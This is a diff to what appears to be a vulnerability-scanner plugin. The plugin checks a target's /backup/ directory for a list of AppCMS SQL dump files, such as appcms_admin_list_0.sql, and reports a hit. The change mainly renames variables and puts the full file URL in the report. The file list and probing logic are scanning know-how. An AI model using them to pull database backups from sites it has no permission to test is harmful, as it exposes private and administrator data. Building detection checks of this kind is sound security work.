@@ -47,16 +47,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
-            payload = "/backup/"
-            url = arg + payload
+            url = self.target + "/backup/"
             sqlFile = ['appcms_admin_list_0.sql', 'appcms_app_history_0.sql', 'appcms_app_list_0.sql', 'appcms_cate_relation_0.sql', 'appcms_category_0.sql',
                        'appcms_flink_0.sql', 'appcms_info_list_0.sql', 'appcms_recommend_area_0.sql', 'appcms_resource_list_0.sql', 'appcms_url_rewrite_0.sql']
-            for f in sqlFile:
-                code, head, res, errcode, finalurl = hh.http(url+f)
+            for _payload in sqlFile:
+                code, head, res, errcode, finalurl = hh.http(url+_payload)
                 if code == 200 and "sql" in res:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞, url={url}'.format(
-                        target=self.target, name=self.vuln.name, url=url))
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                        target=self.target, name=self.vuln.name, url=url+_payload))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
